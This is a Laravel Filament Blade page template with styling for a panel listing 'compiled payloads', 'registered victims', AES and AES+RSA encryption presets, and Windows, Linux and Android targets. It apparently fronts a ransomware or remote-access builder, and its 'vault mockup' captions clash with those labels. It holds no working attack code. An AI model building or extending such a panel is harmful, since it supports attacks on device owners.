<x-filament-panels::page>
    <div class="vault-workspace space-y-5">
        
        <!-- قسم جدول التطبيقات والتحميل المباشر -->
        <div class="workspace-panel p-4">
            <div class="workspace-kicker mb-3">COMPILED PAYLOADS & DEPLOYMENTS</div>
            {{ $this->table }}
        </div>

        <div class="workspace-panel p-4">
            <div class="workspace-kicker mb-3">REGISTERED VICTIMS</div>
            <p class="mb-4 text-xs leading-relaxed text-gray-400">
                Review connected devices, their status, and recent activity.
            </p>
            @livewire(\App\Livewire\Admin\VictimsTable::class)
        </div>

        @if ($profilePreview)
            @php
                $previewIcon = match ($profilePreview['icon']) {
                    'lock' => 'heroicon-o-lock-closed',
                    'key' => 'heroicon-o-key',
                    default => 'heroicon-o-shield-check',
                };
                $previewAlgorithm = match ($profilePreview['algorithm']) {
                    'aes' => 'AES-256-GCM',
                    'hybrid' => 'AES + RSA',
                    default => 'Unsupported preset',
                };
                $previewPlatform = ucfirst($profilePreview['platform']);
            @endphp
            <div class="preview-result" role="status">
                <x-filament::icon :icon="$previewIcon" class="h-5 w-5" />
                <div class="preview-result-copy">
                    <strong>{{ $profilePreview['app_name'] }}</strong>
                    <span>{{ $previewAlgorithm }} · {{ $previewPlatform }} · Preview only, not saved or built</span>
                </div>
            </div>
        @endif

        <div class="workspace-grid">
            <section class="workspace-panel profile-panel">
                <div class="workspace-kicker">LOCAL PROFILE SETUP</div>
                <div class="profile-empty-state">
                    <div class="empty-icon">
                        <x-filament::icon icon="heroicon-o-shield-check" class="h-6 w-6" />
                    </div>
                    <h2>No app profiles yet</h2>
                    <p>Choose a name, icon, encryption preset, and platform to sketch a personal vault profile.</p>
                    <button type="button" class="create-profile-button" wire:click="mountAction('newApp')">
                        <x-filament::icon icon="heroicon-m-plus" class="h-4 w-4" />
                        New app
                    </button>
                </div>
                <div class="preview-caption">
                    <x-filament::icon icon="heroicon-o-eye" class="h-4 w-4" />
                    Design preview only. Nothing is built, saved, or encrypted.
                </div>
            </section>

            <section class="workspace-panel methods-panel">
                <div class="section-heading">
                    <div>
                        <span class="workspace-kicker">CRYPTOGRAPHY</span>
                        <h2>Encryption presets</h2>
                    </div>
                    <span class="mode-count">2 modes</span>
                </div>
                <div class="method-list">
                    <div class="method-row">
                        <span class="method-mark method-aes">A</span>
                        <div class="method-copy">
                            <strong>AES-256-GCM</strong>
                            <span>Symmetric profile</span>
                        </div>
                        <span class="method-indicator indicator-green"></span>
                    </div>
                    <div class="method-row">
                        <span class="method-mark method-hybrid">
                            <x-filament::icon icon="heroicon-o-squares-plus" class="h-4 w-4" />
                        </span>
                        <div class="method-copy">
                            <strong>AES + RSA</strong>
                            <span>Hybrid profile</span>
                        </div>
                        <span class="recommended-label">Recommended</span>
                    </div>
                </div>
                <p class="method-note">Choose a preset in the profile form. This preview does not perform cryptographic operations.</p>
            </section>
        </div>

        <section class="platform-section">
            <div class="platform-section-heading">
                <div>
                    <span class="workspace-kicker">PLATFORM</span>
                    <h2>Choose a local environment</h2>
                </div>
                <span class="platform-count">3 supported targets</span>
            </div>
            <div class="platform-grid">
                <article class="platform-tile windows-tile">
                    <div class="platform-tile-icon">
                        <x-filament::icon icon="heroicon-o-computer-desktop" class="h-5 w-5" />
                    </div>
                    <div class="platform-tile-copy">
                        <h3>Windows</h3>
                        <p>Desktop profile</p>
                    </div>
                    <span class="platform-available">Available</span>
                </article>
                <article class="platform-tile linux-tile">
                    <div class="platform-tile-icon">
                        <x-filament::icon icon="heroicon-o-command-line" class="h-5 w-5" />
                    </div>
                    <div class="platform-tile-copy">
                        <h3>Linux</h3>
                        <p>Desktop profile</p>
                    </div>
                    <span class="platform-available">Available</span>
                </article>
                <article class="platform-tile android-tile">
                    <div class="platform-tile-icon">
                        <x-filament::icon icon="heroicon-o-device-phone-mobile" class="h-5 w-5" />
                    </div>
                    <div class="platform-tile-copy">
                        <h3>Android</h3>
                        <p>Mobile profile</p>
                    </div>
                    <span class="platform-available">Available</span>
                </article>
            </div>
        </section>

        <div class="privacy-note">
            <x-filament::icon icon="heroicon-o-lock-closed" class="h-4 w-4" />
            Local profile mockup only. No device discovery, remote file selection, or application package generation.
        </div>
    </div>

    <style>
        .vault-workspace {
            --surface: #17191b;
            --line: #2b2e30;
            --muted: #999d9f;
            --text: #f2f3f3;
            --green: #42c995;
            --amber: #e3aa37;
            --coral: #dd7777;
            color: var(--text);
        }

        .workspace-grid { display: grid; grid-template-columns: minmax(0, 1.35fr) minmax(300px, .8fr); gap: 16px; }
        .workspace-panel, .platform-section { border: 1px solid var(--line); border-radius: 8px; background: var(--surface); }
        .preview-result { display: flex; align-items: center; gap: 9px; border: 1px solid #28513f; border-radius: 7px; background: #17271f; padding: 11px 14px; color: #a7e1c3; font-size: 12px; }
        .preview-result svg { flex: 0 0 auto; }
        .preview-result-copy { display: grid; gap: 3px; min-width: 0; }
        .preview-result-copy strong { color: #d9f4e5; font-size: 12px; }
        .preview-result-copy span { color: #a7cbb7; font-size: 10px; }
        .profile-panel { display: flex; min-height: 330px; flex-direction: column; padding: 20px; }
        .workspace-kicker { color: #a8adae; font-size: 10px; font-weight: 700; }
        .profile-empty-state { display: flex; flex: 1; flex-direction: column; align-items: center; justify-content: center; padding: 26px 15px 20px; text-align: center; }
        .empty-icon { display: grid; width: 48px; height: 48px; place-items: center; border: 1px solid #3a3528; border-radius: 12px; background: #272319; color: #e7b64a; }
        .profile-empty-state h2 { margin-top: 14px; font-size: 17px; font-weight: 600; }
        .profile-empty-state p { max-width: 350px; margin-top: 6px; color: var(--muted); font-size: 12px; line-height: 1.6; }
        .create-profile-button { display: inline-flex; align-items: center; gap: 7px; margin-top: 17px; border-radius: 6px; background: #eba719; padding: 9px 13px; color: #1b1b19; font-size: 11px; font-weight: 600; transition: background .15s, transform .15s; }
        .create-profile-button:hover { transform: translateY(-1px); background: #f1b82f; }
        .preview-caption { display: flex; align-items: center; gap: 7px; border-top: 1px solid var(--line); padding-top: 13px; color: #969a9b; font-size: 10px; }
        .preview-caption svg { color: #d5a83f; }
        .methods-panel { padding: 20px; }
        .section-heading, .platform-section-heading { display: flex; align-items: center; justify-content: space-between; gap: 12px; }
        .section-heading h2, .platform-section-heading h2 { margin-top: 5px; font-size: 15px; font-weight: 600; }
        .mode-count, .platform-count { color: #a4a8a9; font-size: 10px; }
        .method-list { margin-top: 12px; }
        .method-row { display: flex; min-height: 59px; align-items: center; gap: 11px; border-bottom: 1px solid #282b2d; }
        .method-row:last-child { border-bottom: 0; }
        .method-mark { display: grid; width: 30px; height: 30px; flex: 0 0 30px; place-items: center; border-radius: 8px; font-size: 12px; font-weight: 700; }
        .method-aes { background: #18352c; color: #63d3a8; }
        .method-hybrid { background: #302631; color: #d4a9c7; }
        .method-copy { display: grid; flex: 1; gap: 3px; }
        .method-copy strong { font-size: 11px; font-weight: 600; }
        .method-copy span { color: var(--muted); font-size: 10px; }
        .method-indicator { width: 7px; height: 7px; border-radius: 50%; }
        .indicator-green { background: var(--green); }
        .recommended-label { border: 1px solid #3a3324; border-radius: 999px; padding: 4px 7px; color: #e7c16d; font-size: 9px; white-space: nowrap; }
        .method-note { margin-top: 12px; color: #84898a; font-size: 10px; line-height: 1.5; }
        .platform-section { padding: 18px 20px 20px; }
        .platform-grid { display: grid; grid-template-columns: repeat(3, minmax(0, 1fr)); gap: 12px; margin-top: 15px; }
        .platform-tile { display: flex; min-width: 0; align-items: center; gap: 10px; border: 1px solid #303436; border-radius: 7px; padding: 13px; transition: transform .16s ease, border-color .16s ease; }
        .platform-tile:hover { transform: translateY(-2px); border-color: #55595a; }
        .platform-tile-icon { display: grid; width: 34px; height: 34px; flex: 0 0 34px; place-items: center; border-radius: 8px; }
        .windows-tile .platform-tile-icon { background: #202b35; color: #76b9e8; }
        .linux-tile .platform-tile-icon { background: #2e291d; color: #e5b651; }
        .android-tile .platform-tile-icon { background: #1b3029; color: #70d2a3; }
        .platform-tile-copy { min-width: 0; flex: 1; }
        .platform-tile-copy h3 { font-size: 12px; font-weight: 600; }
        .platform-tile-copy p { margin-top: 3px; color: var(--muted); font-size: 10px; }
        .platform-available { border: 1px solid #343a37; border-radius: 999px; padding: 4px 7px; color: #a8d7c3; font-size: 9px; white-space: nowrap; }
        .privacy-note { display: flex; align-items: center; gap: 8px; color: #858a8b; font-size: 10px; }
        .privacy-note svg { flex: 0 0 auto; color: #c4a452; }

        @media (max-width: 900px) {
            .workspace-grid { grid-template-columns: 1fr; }
            .platform-grid { grid-template-columns: 1fr; }
        }

        @media (max-width: 640px) {
            .profile-panel { min-height: 280px; padding: 16px; }
            .methods-panel, .platform-section { padding: 16px; }
            .platform-tile { padding: 11px; }
            .privacy-note { align-items: flex-start; line-height: 1.5; }
        }
    </style>
</x-filament-panels::page>